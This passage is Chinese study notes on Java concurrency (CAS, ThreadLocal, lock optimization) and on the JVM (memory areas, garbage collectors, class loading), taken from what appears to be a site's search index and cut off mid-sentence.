互斥同步最主要的问题就是线程阻塞和唤醒所带来的性能问题，因此这种同步也称为阻塞同步。\n互斥同步属于一种悲观的并发策略，总是认为只要不去做正确的同步措施，那就肯定会出现问题。无论共享数据是否真的会出现竞争，它都要进行加锁（这里讨论的是概念模型，实际上虚拟机会优化掉很大一部分不必要的加锁）、用户态核心态转换、维护锁计数器和检查是否有被阻塞的线程需要唤醒等操作。\n随着硬件指令集的发展，我们可以使用基于冲突检测的乐观并发策略：先进行操作，如果没有其它线程争用共享数据，那操作就成功了，否则采取补偿措施（不断地重试，直到成功为止）。这种乐观的并发策略的许多实现都不需要将线程阻塞，因此这种同步操作称为非阻塞同步。\n1. CAS    乐观锁需要操作和冲突检测这两个步骤具备原子性，这里就不能再使用互斥同步来保证了，只能靠硬件来完成。硬件支持的原子性操作最典型的是：比较并交换（Compare-and-Swap，CAS）。CAS 指令需要有 3 个操作数，分别是内存地址 V、旧的预期值 A 和新值 B。当执行操作时，只有当 V 的值等于 A，才将 V 的值更新为 B。\n2. AtomicInteger    J.U.C 包里面的整数原子类 AtomicInteger 的方法调用了 Unsafe 类的 CAS 操作。\n以下代码使用了 AtomicInteger 执行了自增的操作。\nprivate AtomicInteger cnt = new AtomicInteger(); public void add() { cnt.incrementAndGet(); } 以下代码是 incrementAndGet() 的源码，它调用了 Unsafe 的 getAndAddInt() 。\npublic final int incrementAndGet() { return unsafe.getAndAddInt(this, valueOffset, 1) + 1; } 以下代码是 getAndAddInt() 源码，var1 指示对象内存地址，var2 指示该字段相对对象内存地址的偏移，var4 指示操作需要加的数值，这里为 1。通过 getIntVolatile(var1, var2) 得到旧的预期值，通过调用 compareAndSwapInt() 来进行 CAS 比较，如果该字段内存地址中的值等于 var5，那么就更新内存地址为 var1+var2 的变量为 var5+var4。\n可以看到 getAndAddInt() 在一个循环中进行，发生冲突的做法是不断的进行重试。\npublic final int getAndAddInt(Object var1, long var2, int var4) { int var5; do { var5 = this.getIntVolatile(var1, var2); } while(!this.compareAndSwapInt(var1, var2, var5, var5 + var4)); return var5; } 3. ABA    如果一个变量初次读取的时候是 A 值，它的值被改成了 B，后来又被改回为 A，那 CAS 操作就会误认为它从来没有被改变过。\nJ.U.C 包提供了一个带有标记的原子引用类 AtomicStampedReference 来解决这个问题，它可以通过控制变量值的版本来保证 CAS 的正确性。大部分情况下 ABA 问题不会影响程序并发的正确性，如果需要解决 ABA 问题，改用传统的互斥同步可能会比原子类更高效。\n无同步方案    要保证线程安全，并不是一定就要进行同步。如果一个方法本来就不涉及共享数据，那它自然就无须任何同步措施去保证正确性。\n1. 栈封闭    多个线程访问同一个方法的局部变量时，不会出现线程安全问题，因为局部变量存储在虚拟机栈中，属于线程私有的。\npublic class StackClosedExample { public void add100() { int cnt = 0; for (int i = 0; i \u0026lt; 100; i++) { cnt++; } System.out.println(cnt); } } public static void main(String[] args) { StackClosedExample example = new StackClosedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -\u0026gt; example.add100()); executorService.execute(() -\u0026gt; example.add100()); executorService.shutdown(); } 100 100 2. 线程本地存储（Thread Local Storage）    如果一段代码中所需要的数据必须与其他代码共享，那就看看这些共享数据的代码是否能保证在同一个线程中执行。如果能保证，我们就可以把共享数据的可见范围限制在同一个线程之内，这样，无须同步也能保证线程之间不出现数据争用的问题。\n符合这种特点的应用并不少见，大部分使用消费队列的架构模式（如“生产者-消费者”模式）都会将产品的消费过程尽量在一个线程中消费完。其中最重要的一个应用实例就是经典 Web 交互模型中的“一个请求对应一个服务器线程”（Thread-per-Request）的处理方式，这种处理方式的广泛应用使得很多 Web 服务端应用都可以使用线程本地存储来解决线程安全问题。\n可以使用 java.lang.ThreadLocal 类来实现线程本地存储功能。\n对于以下代码，thread1 中设置 threadLocal 为 1，而 thread2 设置 threadLocal 为 2。过了一段时间之后，thread1 读取 threadLocal 依然是 1，不受 thread2 的影响。\npublic class ThreadLocalExample { public static void main(String[] args) { ThreadLocal threadLocal = new ThreadLocal(); Thread thread1 = new Thread(() -\u0026gt; { threadLocal.set(1); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(threadLocal.get()); threadLocal.remove(); }); Thread thread2 = new Thread(() -\u0026gt; { threadLocal.set(2); threadLocal.remove(); }); thread1.start(); thread2.start(); } } 1 为了理解 ThreadLocal，先看以下代码：\npublic class ThreadLocalExample1 { public static void main(String[] args) { ThreadLocal threadLocal1 = new ThreadLocal(); ThreadLocal threadLocal2 = new ThreadLocal(); Thread thread1 = new Thread(() -\u0026gt; { threadLocal1.set(1); threadLocal2.set(1); }); Thread thread2 = new Thread(() -\u0026gt; { threadLocal1.set(2); threadLocal2.set(2); }); thread1.start(); thread2.start(); } } 它所对应的底层结构图为：\n\n每个 Thread 都有一个 ThreadLocal.ThreadLocalMap 对象。\n/* ThreadLocal values pertaining to this thread. This map is maintained * by the ThreadLocal class. */ ThreadLocal.ThreadLocalMap threadLocals = null; 当调用一个 ThreadLocal 的 set(T value) 方法时，先得到当前线程的 ThreadLocalMap 对象，然后将 ThreadLocal-\u0026gt;value 键值对插入到该 Map 中。\npublic void set(T value) { Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) map.set(this, value); else createMap(t, value); } get() 方法类似。\npublic T get() { Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) { ThreadLocalMap.Entry e = map.getEntry(this); if (e != null) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) T result = (T)e.value; return result; } } return setInitialValue(); } ThreadLocal 从理论上讲并不是用来解决多线程并发问题的，因为根本不存在多线程竞争。\n在一些场景 (尤其是使用线程池) 下，由于 ThreadLocal.ThreadLocalMap 的底层数据结构导致 ThreadLocal 有内存泄漏的情况，应该尽可能在每次使用 ThreadLocal 后手动调用 remove()，以避免出现 ThreadLocal 经典的内存泄漏甚至是造成自身业务混乱的风险。\n3. 可重入代码（Reentrant Code）    这种代码也叫做纯代码（Pure Code），可以在代码执行的任何时刻中断它，转而去执行另外一段代码（包括递归调用它本身），而在控制权返回后，原来的程序不会出现任何错误。\n可重入代码有一些共同的特征，例如不依赖存储在堆上的数据和公用的系统资源、用到的状态量都由参数中传入、不调用非可重入的方法等。\n十二、锁优化    这里的锁优化主要是指 JVM 对 synchronized 的优化。\n自旋锁    互斥同步进入阻塞状态的开销都很大，应该尽量避免。在许多应用中，共享数据的锁定状态只会持续很短的一段时间。自旋锁的思想是让一个线程在请求一个共享数据的锁时执行忙循环（自旋）一段时间，如果在这段时间内能获得锁，就可以避免进入阻塞状态。\n自旋锁虽然能避免进入阻塞状态从而减少开销，但是它需要进行忙循环操作占用 CPU 时间，它只适用于共享数据的锁定状态很短的场景。\n在 JDK 1.6 中引入了自适应的自旋锁。自适应意味着自旋的次数不再固定了，而是由前一次在同一个锁上的自旋次数及锁的拥有者的状态来决定。\n锁消除    锁消除是指对于被检测出不可能存在竞争的共享数据的锁进行消除。\n锁消除主要是通过逃逸分析来支持，如果堆上的共享数据不可能逃逸出去被其它线程访问到，那么就可以把它们当成私有数据对待，也就可以将它们的锁进行消除。\n对于一些看起来没有加锁的代码，其实隐式的加了很多锁。例如下面的字符串拼接代码就隐式加了锁：\npublic static String concatString(String s1, String s2, String s3) { return s1 + s2 + s3; } String 是一个不可变的类，编译器会对 String 的拼接自动优化。在 JDK 1.5 之前，会转化为 StringBuffer 对象的连续 append() 操作：\npublic static String concatString(String s1, String s2, String s3) { StringBuffer sb = new StringBuffer(); sb.append(s1); sb.append(s2); sb.append(s3); return sb.toString(); } 每个 append() 方法中都有一个同步块。虚拟机观察变量 sb，很快就会发现它的动态作用域被限制在 concatString() 方法内部。也就是说，sb 的所有引用永远不会逃逸到 concatString() 方法之外，其他线程无法访问到它，因此可以进行消除。\n锁粗化    如果一系列的连续操作都对同一个对象反复加锁和解锁，频繁的加锁操作就会导致性能损耗。\n上一节的示例代码中连续的 append() 方法就属于这类情况。如果虚拟机探测到由这样的一串零碎的操作都对同一个对象加锁，将会把加锁的范围扩展（粗化）到整个操作序列的外部。对于上一节的示例代码就是扩展到第一个 append() 操作之前直至最后一个 append() 操作之后，这样只需要加锁一次就可以了。\n轻量级锁    JDK 1.6 引入了偏向锁和轻量级锁，从而让锁拥有了四个状态：无锁状态（unlocked）、偏向锁状态（biasble）、轻量级锁状态（lightweight locked）和重量级锁状态（inflated）。\n以下是 HotSpot 虚拟机对象头的内存布局，这些数据被称为 Mark Word。其中 tag bits 对应了五个状态，这些状态在右侧的 state 表格中给出。除了 marked for gc 状态，其它四个状态已经在前面介绍过了。\n\n下图左侧是一个线程的虚拟机栈，其中有一部分称为 Lock Record 的区域，这是在轻量级锁运行过程创建的，用于存放锁对象的 Mark Word。而右侧就是一个锁对象，包含了 Mark Word 和其它信息。\n\n轻量级锁是相对于传统的重量级锁而言，它使用 CAS 操作来避免重量级锁使用互斥量的开销。对于绝大部分的锁，在整个同步周期内都是不存在竞争的，因此也就不需要都使用互斥量进行同步，可以先采用 CAS 操作进行同步，如果 CAS 失败了再改用互斥量进行同步。\n当尝试获取一个锁对象时，如果锁对象标记为 0 01，说明锁对象的锁未锁定（unlocked）状态。此时虚拟机在当前线程的虚拟机栈中创建 Lock Record，然后使用 CAS 操作将对象的 Mark Word 更新为 Lock Record 指针。如果 CAS 操作成功了，那么线程就获取了该对象上的锁，并且对象的 Mark Word 的锁标记变为 00，表示该对象处于轻量级锁状态。\n\n如果 CAS 操作失败了，虚拟机首先会检查对象的 Mark Word 是否指向当前线程的虚拟机栈，如果是的话说明当前线程已经拥有了这个锁对象，那就可以直接进入同步块继续执行，否则说明这个锁对象已经被其他线程线程抢占了。如果有两条以上的线程争用同一个锁，那轻量级锁就不再有效，要膨胀为重量级锁。\n偏向锁    偏向锁的思想是偏向于让第一个获取锁对象的线程，这个线程在之后获取该锁就不再需要进行同步操作，甚至连 CAS 操作也不再需要。\n当锁对象第一次被线程获得的时候，进入偏向状态，标记为 1 01。同时使用 CAS 操作将线程 ID 记录到 Mark Word 中，如果 CAS 操作成功，这个线程以后每次进入这个锁相关的同步块就不需要再进行任何同步操作。\n当有另外一个线程去尝试获取这个锁对象时，偏向状态就宣告结束，此时撤销偏向（Revoke Bias）后恢复到未锁定状态或者轻量级锁状态。\n\n十三、多线程开发良好的实践      给线程起个有意义的名字，这样可以方便找 Bug。\n  缩小同步范围，从而减少锁争用。例如对于 synchronized，应该尽量使用同步块而不是同步方法。\n  多用同步工具少用 wait() 和 notify()。首先，CountDownLatch, CyclicBarrier, Semaphore 和 Exchanger 这些同步类简化了编码操作，而用 wait() 和 notify() 很难实现复杂控制流；其次，这些同步类是由最好的企业编写和维护，在后续的 JDK 中还会不断优化和完善。\n  使用 BlockingQueue 实现生产者消费者问题。\n  多用并发集合少用同步集合，例如应该使用 ConcurrentHashMap 而不是 Hashtable。\n  使用本地变量和不可变类来保证线程安全。\n  使用线程池而不是直接创建线程，这是因为创建线程代价很高，线程池可以有效地利用有限的线程来启动任务。\n  参考资料     BruceEckel. Java 编程思想: 第 4 版 [M]. 机械工业出版社, 2007. 周志明. 深入理解 Java 虚拟机 [M]. 机械工业出版社, 2011. Threads and Locks 线程通信 Java 线程面试题 Top 50 BlockingQueue thread state java CSC 456 Spring 2012/ch7 MN Java - Understanding Happens-before relationship 6장 Thread Synchronization How is Java\u0026rsquo;s ThreadLocal implemented under the hood? Concurrent JAVA FORK JOIN EXAMPLE 聊聊并发（八）——Fork/Join 框架介绍 Eliminating SynchronizationRelated Atomic Operations with Biased Locking and Bulk Rebiasing  "},{"id":215,"href":"/%E7%AC%94%E8%AE%B0/JavaJava-%E8%99%9A%E6%8B%9F%E6%9C%BA/","title":"Java 虚拟机","parent":"笔记","content":"Java 虚拟机     Java 虚拟机  一、运行时数据区域  程序计数器 Java 虚拟机栈 本地方法栈 堆 方法区 运行时常量池 直接内存   二、垃圾收集  判断一个对象是否可被回收 引用类型 垃圾收集算法 垃圾收集器   三、内存分配与回收策略  Minor GC 和 Full GC 内存分配策略 Full GC 的触发条件   四、类加载机制  类的生命周期 类加载过程 类初始化时机 类与类加载器 类加载器分类 双亲委派模型 自定义类加载器实现   参考资料    本文大部分内容参考 周志明《深入理解 Java 虚拟机》 ，想要深入学习的话请看原书。\n一、运行时数据区域    \n程序计数器    记录正在执行的虚拟机字节码指令的地址（如果正在执行的是本地方法则为空）。\nJava 虚拟机栈    每个 Java 方法在执行的同时会创建一个栈帧用于存储局部变量表、操作数栈、常量池引用等信息。从方法调用直至执行完成的过程，对应着一个栈帧在 Java 虚拟机栈中入栈和出栈的过程。\n\n可以通过 -Xss 这个虚拟机参数来指定每个线程的 Java 虚拟机栈内存大小，在 JDK 1.4 中默认为 256K，而在 JDK 1.5+ 默认为 1M：\njava -Xss2M HackTheJava 该区域可能抛出以下异常：\n 当线程请求的栈深度超过最大值，会抛出 StackOverflowError 异常； 栈进行动态扩展时如果无法申请到足够内存，会抛出 OutOfMemoryError 异常。  本地方法栈    本地方法栈与 Java 虚拟机栈类似，它们之间的区别只不过是本地方法栈为本地方法服务。\n本地方法一般是用其它语言（C、C++ 或汇编语言等）编写的，并且被编译为基于本机硬件和操作系统的程序，对待这些方法需要特别处理。\n\n堆    所有对象都在这里分配内存，是垃圾收集的主要区域（\u0026ldquo;GC 堆\u0026rdquo;）。\n现代的垃圾收集器基本都是采用分代收集算法，其主要的思想是针对不同类型的对象采取不同的垃圾回收算法。可以将堆分成两块：\n 新生代（Young Generation） 老年代（Old Generation）  堆不需要连续内存，并且可以动态增加其内存，增加失败会抛出 OutOfMemoryError 异常。\n可以通过 -Xms 和 -Xmx 这两个虚拟机参数来指定一个程序的堆内存大小，第一个参数设置初始值，第二个参数设置最大值。\njava -Xms1M -Xmx2M HackTheJava 方法区    用于存放已被加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。\n和堆一样不需要连续的内存，并且可以动态扩展，动态扩展失败一样会抛出 OutOfMemoryError 异常。\n对这块区域进行垃圾回收的主要目标是对常量池的回收和对类的卸载，但是一般比较难实现。\nHotSpot 虚拟机把它当成永久代来进行垃圾回收。但很难确定永久代的大小，因为它受到很多因素影响，并且每次 Full GC 之后永久代的大小都会改变，所以经常会抛出 OutOfMemoryError 异常。为了更容易管理方法区，从 JDK 1.8 开始，移除永久代，并把方法区移至元空间，它位于本地内存中，而不是虚拟机内存中。\n方法区是一个 JVM 规范，永久代与元空间都是其一种实现方式。在 JDK 1.8 之后，原来永久代的数据被分到了堆和元空间中。元空间存储类的元信息，静态变量和常量池等放入堆中。\n运行时常量池    运行时常量池是方法区的一部分。\nClass 文件中的常量池（编译器生成的字面量和符号引用）会在类加载后被放入这个区域。\n除了在编译期生成的常量，还允许动态生成，例如 String 类的 intern()。\n直接内存    在 JDK 1.4 中新引入了 NIO 类，它可以使用 Native 函数库直接分配堆外内存，然后通过 Java 堆里的 DirectByteBuffer 对象作为这块内存的引用进行操作。这样能在一些场景中显著提高性能，因为避免了在堆内存和堆外内存来回拷贝数据。\n二、垃圾收集    垃圾收集主要是针对堆和方法区进行。程序计数器、虚拟机栈和本地方法栈这三个区域属于线程私有的，只存在于线程的生命周期内，线程结束之后就会消失，因此不需要对这三个区域进行垃圾回收。\n判断一个对象是否可被回收    1. 引用计数算法    为对象添加一个引用计数器，当对象增加一个引用时计数器加 1，引用失效时计数器减 1。引用计数为 0 的对象可被回收。\n在两个对象出现循环引用的情况下，此时引用计数器永远不为 0，导致无法对它们进行回收。正是因为循环引用的存在，因此 Java 虚拟机不使用引用计数算法。\npublic class Test { public Object instance = null; public static void main(String[] args) { Test a = new Test(); Test b = new Test(); a.instance = b; b.instance = a; a = null; b = null; doSomething(); } } 在上述代码中，a 与 b 引用的对象实例互相持有了对象的引用，因此当我们把对 a 对象与 b 对象的引用去除之后，由于两个对象还存在互相之间的引用，导致两个 Test 对象无法被回收。\n2. 可达性分析算法    以 GC Roots 为起始点进行搜索，可达的对象都是存活的，不可达的对象可被回收。\nJava 虚拟机使用该算法来判断对象是否可被回收，GC Roots 一般包含以下内容：\n 虚拟机栈中局部变量表中引用的对象 本地方法栈中 JNI 中引用的对象 方法区中类静态属性引用的对象 方法区中的常量引用的对象  \n3. 方法区的回收    因为方法区主要存放永久代对象，而永久代对象的回收率比新生代低很多，所以在方法区上进行回收性价比不高。\n主要是对常量池的回收和对类的卸载。\n为了避免内存溢出，在大量使用反射和动态代理的场景都需要虚拟机具备类卸载功能。\n类的卸载条件很多，需要满足以下三个条件，并且满足了条件也不一定会被卸载：\n 该类所有的实例都已经被回收，此时堆中不存在该类的任何实例。 加载该类的 ClassLoader 已经被回收。 该类对应的 Class 对象没有在任何地方被引用，也就无法在任何地方通过反射访问该类方法。  4. finalize()    类似 C++ 的析构函数，用于关闭外部资源。但是 try-finally 等方式可以做得更好，并且该方法运行代价很高，不确定性大，无法保证各个对象的调用顺序，因此最好不要使用。\n当一个对象可被回收时，如果需要执行该对象的 finalize() 方法，那么就有可能在该方法中让对象重新被引用，从而实现自救。自救只能进行一次，如果回收的对象之前调用了 finalize() 方法自救，后面回收时不会再调用该方法。\n引用类型    无论是通过引用计数算法判断对象的引用数量，还是通过可达性分析算法判断对象是否可达，判定对象是否可被回收都与引用有关。\nJava 提供了四种强度不同的引用类型。\n1. 强引用    被强引用关联的对象不会被回收。\n使用 new 一个新对象的方式来创建强引用。\nObject obj = new Object(); 2. 软引用    被软引用关联的对象只有在内存不够的情况下才会被回收。\n使用 SoftReference 类来创建软引用。\nObject obj = new Object(); SoftReference\u0026lt;Object\u0026gt; sf = new SoftReference\u0026lt;Object\u0026gt;(obj); obj = null; // 使对象只被软引用关联 3. 弱引用    被弱引用关联的对象一定会被回收，也就是说它只能存活到下一次垃圾回收发生之前。\n使用 WeakReference 类来创建弱引用。\nObject obj = new Object(); WeakReference\u0026lt;Object\u0026gt; wf = new WeakReference\u0026lt;Object\u0026gt;(obj); obj = null; 4. 虚引用    又称为幽灵引用或者幻影引用，一个对象是否有虚引用的存在，不会对其生存时间造成影响，也无法通过虚引用得到一个对象。\n为一个对象设置虚引用的唯一目的是能在这个对象被回收时收到一个系统通知。\n使用 PhantomReference 来创建虚引用。\nObject obj = new Object(); PhantomReference\u0026lt;Object\u0026gt; pf = new PhantomReference\u0026lt;Object\u0026gt;(obj, null); obj = null; 垃圾收集算法    1. 标记 - 清除    \n在标记阶段，程序会检查每个对象是否为活动对象，如果是活动对象，则程序会在对象头部打上标记。\n在清除阶段，会进行对象回收并取消标志位，另外，还会判断回收后的分块与前一个空闲分块是否连续，若连续，会合并这两个分块。回收对象就是把对象作为分块，连接到被称为 “空闲链表” 的单向链表，之后进行分配时只需要遍历这个空闲链表，就可以找到分块。\n在分配时，程序会搜索空闲链表寻找空间大于等于新对象大小 size 的块 block。如果它找到的块等于 size，会直接返回这个分块；如果找到的块大于 size，会将块分割成大小为 size 与 (block - size) 的两部分，返回大小为 size 的分块，并把大小为 (block - size) 的块返回给空闲链表。\n不足：\n 标记和清除过程效率都不高； 会产生大量不连续的内存碎片，导致无法给大对象分配内存。  2. 标记 - 整理    \n让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存。\n优点:\n 不会产生内存碎片  不足:\n 需要移动大量对象，处理效率比较低。  3. 复制    \n将内存划分为大小相等的两块，每次只使用其中一块，当这一块内存用完了就将还存活的对象复制到另一块上面，然后再把使用过的内存空间进行一次清理。\n主要不足是只使用了内存的一半。\n现在的商业虚拟机都采用这种收集算法回收新生代，但是并不是划分为大小相等的两块，而是一块较大的 Eden 空间和两块较小的 Survivor 空间，每次使用 Eden 和其中一块 Survivor。在回收时，将 Eden 和 Survivor 中还存活着的对象全部复制到另一块 Survivor 上，最后清理 Eden 和使用过的那一块 Survivor。\nHotSpot 虚拟机的 Eden 和 Survivor 大小比例默认为 8:1，保证了内存的利用率达到 90%。如果每次回收有多于 10% 的对象存活，那么一块 Survivor 就不够用了，此时需要依赖于老年代进行空间分配担保，也就是借用老年代的空间存储放不下的对象。\n4. 分代收集    现在的商业虚拟机采用分代收集算法，它根据对象存活周期将内存划分为几块，不同块采用适当的收集算法。\n一般将堆分为新生代和老年代。\n 新生代使用：复制算法 老年代使用：标记 - 清除 或者 标记 - 整理 算法  垃圾收集器    \n以上是 HotSpot 虚拟机中的 7 个垃圾收集器，连线表示垃圾收集器可以配合使用。\n 单线程与多线程：单线程指的是垃圾收集器只使用一个线程，而多线程使用多个线程； 串行与并行：串行指的是垃圾收集器与用户程序交替执行，这意味着在执行垃圾收集的时候需要停顿用户程序；并行指的是垃圾收集器和用户程序同时执行。除了 CMS 和 G1 之外，其它垃圾收集器都是以串行的方式执行。  1. Serial 收集器    \nSerial 翻译为串行，也就是说它以串行的方式执行。\n它是单线程的收集器，只会使用一个线程进行垃圾收集工作。\n它的优点是简单高效，在单个 CPU 环境下，由于没有线程交互的开销，因此拥有最高的单线程收集效率。\n它是 Client 场景下的默认新生代收集器，因为在该场景下内存一般来说不会很大。它收集一两百兆垃圾的停顿时间可以控制在一百多毫秒以内，只要不是太频繁，这点停顿时间是可以接受的。\n2. ParNew 收集器    \n它是 Serial 收集器的多线程版本。\n它是 Server 场景下默认的新生代收集器，除了性能原因外，主要是因为除了 Serial 收集器，只有它能与 CMS 收集器配合使用。\n3. Parallel Scavenge 收集器    与 ParNew 一样是多线程收集器。\n其它收集器目标是尽可能缩短垃圾收集时用户线程的停顿时间，而它的目标是达到一个可控制的吞吐量，因此它被称为“吞吐量优先”收集器。这里的吞吐量指 CPU 用于运行用户程序的时间占总时间的比值。\n停顿时间越短就越适合需要与用户交互的程序，良好的响应速度能提升用户体验。而高吞吐量则可以高效率地利用 CPU 时间，尽快完成程序的运算任务，适合在后台运算而不需要太多交互的任务。\n缩短停顿时间是以牺牲吞吐量和新生代空间来换取的：新生代空间变小，垃圾回收变得频繁，导致吞吐量下降。\n可以通过一个开关参数打开 GC 自适应的调节策略（GC Ergonomics），就不需要手工指定新生代的大小（-Xmn）、Eden 和 Survivor 区的比例、晋升老年代对象年龄等细节参数了。虚拟机会根据当前系统的运行情况收集性能监控信息，动态调整这些参数以提供最合适的停顿时间或者最大的吞吐量。\n4. Serial Old 收集器    \n是 Serial 收集器的老年代版本，也是给 Client 场景下的虚拟机使用。如果用在 Server 场景下，它有两大用途：\n 在 JDK 1.5 以及之前版本（Parallel Old 诞生以前）中与 Parallel Scavenge 收集器搭配使用。 作为 CMS 收集器的后备预案，在并发收集发生 Concurrent Mode Failure 时使用。  5. Parallel Old 收集器    \n是 Parallel Scavenge 收集器的老年代版本。\n在注重吞吐量以及 CPU 资源敏感的场合，都可以优先考虑 Parallel Scavenge 加 Parallel Old 收集器。\n6. CMS 收集器    \nCMS（Concurrent Mark Sweep），Mark Sweep 指的是标记 - 清除算法。\n分为以下四个流程：\n 初始标记：仅仅只是标记一下 GC Roots 能直接关联到的对象，速度很快，需要停顿。 并发标记：进行 GC Roots Tracing 的过程，它在整个回收过程中耗时最长，不需要停顿。 重新标记：为了修正并发标记期间因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录，需要停顿。 并发清除：不需要停顿。  在整个过程中耗时最长的并发标记和并发清除过程中，收集器线程都可以与用户线程一起工作，不需要进行停顿。\n具有以下缺点：\n 吞吐量低：低停顿时间是以牺牲吞吐量为代价的，导致 CPU 利用率不够高。 无法处理浮动垃圾，可能出现 Concurrent Mode Failure。浮动垃圾是指并发清除阶段由于用户线程继续运行而产生的垃圾，这部分垃圾只能到下一次 GC 时才能进行回收。由于浮动垃圾的存在，因此需要预留出一部分内存，意味着 CMS 收集不能像其它收集器那样等待老年代快满的时候再回收。如果预留的内存不够存放浮动垃圾，就会出现 Concurrent Mode Failure，这时虚拟机将临时启用 Serial Old 来替代 CMS。 标记 - 清除算法导致的空间碎片，往往出现老年代空间剩余，但无法找到足够大连续空间来分配当前对象，不得不提前触发一次 Full GC。  7. G1 收集器    G1（Garbage-First），它是一款面向服务端应用的垃圾收集器，在多 CPU 和大内存的场景下有很好的性能。HotSpot 开发团队赋予它的使命是未来可以替换掉 CMS 收集器。\n堆被分为新生代和老年代，其它收集器进行收集的范围都是整个新生代或者老年代，而 G1 可以直接对新生代和老年代一起回收。\n\nG1 把堆划分成多个大小相等的独立区域（Region），新生代和老年代不再物理隔离。\n\n通过引入 Region 的概念，从而将原来的一整块内存空间划分成多个的小空间，使得每个小空间可以单独进行垃圾回收。这种划分方法带来了很大的灵活性，使得可预测的停顿时间模型成为可能。通过记录每个 Region 垃圾回收时间以及回收所获得的空间（这两个值是通过过去回收的经验获得），并维护一个优先列表，每次根据允许的收集时间，优先回收价值最大的 Region。\n每个 Region 都有一个 Remembered Set，用来记录该 Region 对象的引用对象所在的 Region。通过使用 Remembered Set，在做可达性分析的时候就可以避免全堆扫描。\n\n如果不计算维护 Remembered Set 的操作，G1 收集器的运作大致可划分为以下几个步骤：\n 初始标记 并发标记 最终标记：为了修正在并发标记期间因用户程序继续运作而导致标记产生变动的那一部分标记记录，虚拟机将这段时间对象变化记录在线程的 Remembered Set Logs 里面，最终标记阶段需要把 Remembered Set Logs 的数据合并到 Remembered Set 中。这阶段需要停顿线程，但是可并行执行。 筛选回收：首先对各个 Region 中的回收价值和成本进行排序，根据用户所期望的 GC 停顿时间来制定回收计划。此阶段其实也可以做到与用户程序一起并发执行，但是因为只回收一部分 Region，时间是用户可控制的，而且停顿用户线程将大幅度提高收集效率。  具备如下特点：\n 空间整合：整体来看是基于“标记 - 整理”算法实现的收集器，从局部（两个 Region 之间）上来看是基于“复制”算法实现的，这意味着运行期间不会产生内存空间碎片。 可预测的停顿：能让使用者明确指定在一个长度为 M 毫秒的时间片段内，消耗在 GC 上的时间不得超过 N 毫秒。  三、内存分配与回收策略    Minor GC 和 Full GC      Minor GC：回收新生代，因为新生代对象存活时间很短，因此 Minor GC 会频繁执行，执行的速度一般也会比较快。\n  Full GC：回收老年代和新生代，老年代对象其存活时间长，因此 Full GC 很少执行，执行速度会比 Minor GC 慢很多。\n  内存分配策略    1. 对象优先在 Eden 分配    大多数情况下，对象在新生代 Eden 上分配，当 Eden 空间不够时，发起 Minor GC。\n2. 大对象直接进入老年代    大对象是指需要连续内存空间的对象，最典型的大对象是那种很长的字符串以及数组。\n经常出现大对象会提前触发垃圾收集以获取足够的连续空间分配给大对象。\n-XX:PretenureSizeThreshold，大于此值的对象直接在老年代分配，避免在 Eden 和 Survivor 之间的大量内存复制。\n3. 长期存活的对象进入老年代    为对象定义年龄计数器，对象在 Eden 出生并经过 Minor GC 依然存活，将移动到 Survivor 中，年龄就增加 1 岁，增加到一定年龄则移动到老年代中。\n-XX:MaxTenuringThreshold 用来定义年龄的阈值。\n4. 动态对象年龄判定    虚拟机并不是永远要求对象的年龄必须达到 MaxTenuringThreshold 才能晋升老年代，如果在 Survivor 中相同年龄所有对象大小的总和大于 Survivor 空间的一半，则年龄大于或等于该年龄的对象可以直接进入老年代，无需等到 MaxTenuringThreshold 中要求的年龄。\n5. 空间分配担保    在发生 Minor GC 之前，虚拟机先检查老年代最大可用的连续空间是否大于新生代所有对象总空间，如果条件成立的话，那么 Minor GC 可以确认是安全的。\n如果不成立的话虚拟机会查看 HandlePromotionFailure 的值是否允许担保失败，如果允许那么就会继续检查老年代最大可用的连续空间是否大于历次晋升到老年代对象的平均大小，如果大于，将尝试着进行一次 Minor GC；如果小于，或者 HandlePromotionFailure 的值不允许冒险，那么就要进行一次 Full GC。\nFull GC 的触发条件    对于 Minor GC，其触发条件非常简单，当 Eden 空间满时，就将触发一次 Minor GC。而 Full GC 则相对复杂，有以下条件：\n1. 调用 System.gc()    只是建议虚拟机执行 Full GC，但是虚拟机不一定真正去执行。不建议使用这种方式，而是让虚拟机管理内存。\n2. 老年代空间不足    老年代空间不足的常见场景为前文所讲的大对象直接进入老年代、长期存活的对象进入老年代等。\n为了避免以上原因引起的 Full GC，应当尽量不要创建过大的对象以及数组。除此之外，可以通过 -Xmn 虚拟机参数调大新生代的大小，让对象尽量在新生代被回收掉，不进入老年代。还可以通过 -XX:MaxTenuringThreshold 调大对象进入老年代的年龄，让对象在新生代多存活一段时间。\n3. 空间分配担保失败    使用复制算法的 Minor GC 需要老年代的内存空间作担保，如果担保失败会执行一次 Full GC。具体内容请参考上面的第 5 小节。\n4. JDK 1.7 及以前的永久代空间不足    在 JDK 1.7 及以前，HotSpot 虚拟机中的方法区是用永久代实现的，永久代中存放的为一些 Class 的信息、常量、静态变量等数据。\n当系统中要加载的类、反射的类和调用的方法较多时，永久代可能会被占满，在未配置为采用 CMS GC 的情况下也会执行 Full GC。如果经过 Full GC 仍然回收不了，那么虚拟机会抛出 java.lang.OutOfMemoryError。\n为避免以上原因引起的 Full GC，可采用的方法为增大永久代空间或转为使用 CMS GC。\n5. Concurrent Mode Failure    执行 CMS GC 的过程中同时有对象要放入老年代，而此时老年代空间不足（可能是 GC 过程中浮动垃圾过多导致暂时性的空间不足），便会报 Concurrent Mode Failure 错误，并触发 Full GC。\n四、类加载机制    类是在运行期间第一次使用时动态加载的，而不是一次性加载所有类。因为如果一次性加载，那么会占用很多的内存。\n类的生命周期    \n包括以下 7 个阶段：\n 加载（Loading） 验证（Verification） 准备（Preparation） 解析（Resolution） 初始化（Initialization） 使用（Using） 卸载（Unloading）  类加载过程    包含了加载、验证、准备、解析和初始化这 5 个阶段。\n1. 加载    加载是类加载的一个阶段，注意不要混淆。\n加载过程完成以下三件事：\n 通过类的完全限定名称获取定义该类的二进制字节流。 将该字节流表示的静态存储结构转换为方法区的运行时存储结构。 在内存中生成一个代表该类的 Class 对象，作为方法区中该类各种数据的访问入口。  其中二进制字节流可以从以下方式中获取：\n 从 ZIP 包读取，成为 JAR、EAR、WAR 